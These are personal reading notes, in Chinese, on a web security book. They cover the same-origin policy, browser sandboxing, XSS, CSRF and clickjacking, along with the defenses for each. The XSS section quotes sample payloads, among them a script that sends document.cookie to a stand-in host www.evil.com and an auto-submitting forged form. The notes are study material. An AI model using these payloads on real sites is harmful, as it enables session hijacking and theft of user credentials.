# 《白帽子讲Web安全》读书笔记

# 第1章 我的安全世界观
安全三要素：机密性、完整性（无篡改）、可用性。后来又添加了可审计性、不可抵赖性。

实施安全评估的步骤：
1.资产等级划分：对要保护的数据做等级划分，确定信任域和信任边界；
2.威胁分析：可能造成危害的来源称为威胁（伪装、篡改、抵赖、信息泄露、拒绝服务、提升权限）；
3.风险分析：可能出现的损失称为风险；（DREAD模型，略）

白帽子兵法：
1.Secure By Default原则：白名单优于黑名单；
2.纵深防御原则：在不同层面、不同方面实施正确的安全方案；
3.数据与代码分离原则（杜绝注入）；
4.不可预测性原则（对抗基于篡改、伪造的攻击）；


# 第2章 浏览器安全

## 同源策略
同源策略是浏览器最核心、最基本的安全功能。影响源的因素包括：host（或IP）、子域名、端口、协议；

注意：对于当前页面，页面内JavaScript文件自身的域并不重要，重要的是加载JavaScript的页面所在的域。

`<script>、<img>、<iframe>、<link>`等带src属性的标签可以跨域加载资源，每次加载实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源被JavaScript限制了权限：不能读、写返回的内容。XMLHttpRequest可以访问来自同源对象的内容。W3C同时也制定了XMLHttpRequest跨域访问的标准：通过目标域返回的HTTP头来授权是否允许跨域访问（Access-Control-Allow-Origin）。这个跨域访问方案的安全基础基于“JavaScript无法控制该HTTP头”。

## 浏览器沙箱
现代的浏览器采用多进程架构来将各个功能模块分开，渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程通信、与操作系统通信都需要经过IPC channel，而在其中会进行一些安全检查。Sandbox的设计目的就是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源，要跨越Sandbox边界产生数据交换只能经由指定的数据通道（封装的API）。


## 恶意网址拦截
现在的浏览器通常会对恶意网址进行提示。

## 浏览器插件
插件可能存在漏洞，甚至本身就有恶意行为。


# 第3章 跨站脚本攻击（XSS）
Cross Site Script，指通过HTML注入篡改了网页，插入恶意脚本，从而在用户浏览网页时执行攻击。（一开始这种攻击都是用来演示跨域攻击的，所以叫跨站脚本，到如今是否跨域已经不再重要）

例：
```
<?php
$input = $_GET["param"];
echo "<div>" . $input . "</div>";
?>
```
提交这样一个请求：
```
test.php?param=<script>alert(/xss/)</script>
```

## XSS Payload
XSS Payload实际上就是JavaScript脚本，所以任何JavaScript脚本能实现的功能XSS Payload都能做到。比如读取Cookies，从而发起Cookies劫持攻击（Cookies中可能有登录凭证）；
例如攻击者先加载这样一个远程脚本：
http://www.a.com/test.html?abc="><script src=http://www.evil.com/evil.js></script>"，正在的Payload写在这个远程脚本中从而避免直接在URL参数中写入大量的Javascript代码。在evil.js中通过如下方式窃取Cookies：
```
var img = document.createElement("img");
img.src = "http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```
【test.html的内容没有，上面的例子不通顺，艹】


同样的，可以通过img的src标签来发起GET请求。对于POST请求，则可以通过JavaScript动态构造一个表单，然后自动提交这个表单来实现：
```
var f = document.createElement("form");
f.action = "...";
f.method = "post";
document.body.appendChild(f);

var il = document.createElement("input");
il.name = "ck";
il.value = "dd";
f.append(il);

f.submit();
```

详略（很多历史问题原理的讨论，现已修复）。

通过style标签也能构造出XSS：
```
<div style="background: url('javascript:alert(1)')">
```

## XSS Worm
一般来说，用户之间发生交互行为的页面（发送站内信、用户留言等），如果存在存储型XSS，则比较容易发起XSS Worm攻击。
详略。

## XSS构造技巧
利用字符编码，绕过长度限制，利用<base>标签，利用window.name等，详略。

## XSS的防御
1.将Cookies设为HttpOnly，浏览器将禁止页面的JavaScript访问带有HttpOnly的Cookie。（严格来说HttpOnly并非为了对抗XSS，它解决的是XSS后的Cookies劫持攻击）。
服务器可能会设置多个Cookie，而HttpOnly可以有选择性地加在任何一个Cookie上：
```
<?php
header("Set-Cookie:cookie1=test1;");
header("Set-Cookie:cookie2=test2;httponly",false);
?>
```
当通过document.cookie读取cookie时，只有cookie1能被JavaScript读取到。

2.输入检查：即对输入格式进行检查，检查工作必须放在服务器端代码中实现；

3.输出检查：在变量输出到HTML页面时使用编码或转义的方式（HtmlEncode）来防御XSS攻击；


# 第4章 跨站点请求伪造（CSRF）
Cross Site Request Forgery。

## 浏览器Cookie策略
Cookie有两种：
1.Session Cookie，又称临时Cookie，浏览器关闭后即消失；保存在浏览器进程空间中，所以在浏览器中新打开tab时仍然有效。
2.Third-party Cookie，又称本地Cookie，在设置时指定过期时间；保存在本地。

当浏览器从一个域的页面中加载另一个域的资源时，出于安全考虑，某些浏览器会阻止Third-party Cookie的发送。比如在b域中通过iframe引用a域的页面，这种情况下不会带上a域的cookie。然而FireFox默认不阻止Third-party Cookie的发送，所以更容易发生CSRF攻击。

## P3P头的副作用
略。

## CSRF的防御
1.验证码；

2.Referer Check：检查请求是否来自合法的源。缺陷在于服务器并非什么时候都能取到Referer（比如用户的浏览器隐私设置、从HTTPS跳转HTTP等）。

3.Anti CSRF Token
同时在表单和Session（或cookie）中设置一个token，在提交请求时服务器验证表单中的token和用户Session（或cookie）中的token是否一致，如果一致则为合法请求，否则可能发生了CSRF攻击。
token应该不可预测，且当表单提交后，token应该失效。

## XSRF
Anti CSRF Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会无效，因为XSS可以模拟客户端浏览器执行任意操作，包括请求页面后读出页面里的token，然后再构造出一个合法的请求，这个过程称为XSRF。


# 第5章 点击劫持（ClickJacking）
点击劫持是一种视觉上的欺骗手段，比如使用一个透明的iframe覆盖在一个网页上，然后诱使用户在该网页上进行操作，通过调整iframe页面的位置，可以使得用户恰好点击在iframe页面的一些功能性按钮上。

图片覆盖是另一种类似的视觉欺骗的方法。

## 防御ClickJacking
1.frame busting：通过写一段JavaScript代码禁止iframe的嵌套；（由于使用JavaScript，因此控制能力并不是特别强，有很多方法可以绕过它）

2.X-Frame-Options
当值为DENY时浏览器会拒绝当前页面加载任何frame页面，为SAMEORIGIN时可以加载同源下的页面，当值为ALLOW-FROM，可以定义运行的页面。


# 第6章 HTML5安全



























